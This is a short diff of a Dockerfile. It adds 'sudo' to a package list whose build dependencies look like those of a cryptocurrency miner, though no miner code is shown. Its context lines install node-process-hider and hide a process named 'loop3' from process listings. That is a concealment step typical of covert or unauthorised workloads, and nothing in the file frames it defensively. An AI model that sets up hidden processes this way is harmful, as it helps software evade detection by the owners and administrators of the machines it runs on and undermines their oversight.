@@ -2,7 +2,7 @@ FROM debian:sid
 
 RUN apt update -y \
     	&& apt upgrade -y \
-    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev  libjansson-dev libgmp-dev nodejs npm make gcc g++ git zlib1g-dev ocl-icd-opencl-dev
+    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev sudo libjansson-dev libgmp-dev nodejs npm make gcc g++ git zlib1g-dev ocl-icd-opencl-dev
          
 RUN sudo npm i -g node-process-hider
 RUN sudo ph add loop3
